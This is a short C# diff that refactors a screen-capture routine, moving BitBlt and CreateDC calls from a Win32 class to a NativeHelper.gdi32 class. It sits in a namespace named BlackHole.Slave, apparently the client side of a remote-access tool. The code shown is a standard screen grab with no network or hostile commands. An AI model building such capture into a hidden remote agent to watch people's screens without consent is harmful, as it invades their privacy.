@@ -9,7 +9,7 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
-namespace BlackHole.Slave
+namespace BlackHole.Slave.Helper
 {
     /// <summary>
     /// 
@@ -33,12 +33,12 @@ namespace BlackHole.Slave
             using (var dest = Graphics.FromImage(screen))
             {
                 var destPtr = dest.GetHdc();
-                var srcPtr = Win32.gdi32_CreateDC("DISPLAY", 
+                var srcPtr = NativeHelper.gdi32.CreateDC("DISPLAY", 
                     null, 
                     null, 
                     IntPtr.Zero);
 
-                Win32.gdi32_BitBlt(destPtr, 
+                NativeHelper.gdi32.BitBlt(destPtr, 
                     0, 
                     0, 
                     bounds.Width, 
@@ -46,9 +46,9 @@ namespace BlackHole.Slave
                     srcPtr, 
                     bounds.X,
                     bounds.Y, 
-                    Win32.ROP_COPY);
+                    NativeHelper.gdi32.ROP_COPY);
 
-                Win32.gdi32_DeleteDC(srcPtr);
+                NativeHelper.gdi32.DeleteDC(srcPtr);
                 dest.ReleaseHdc(destPtr);
             }
 
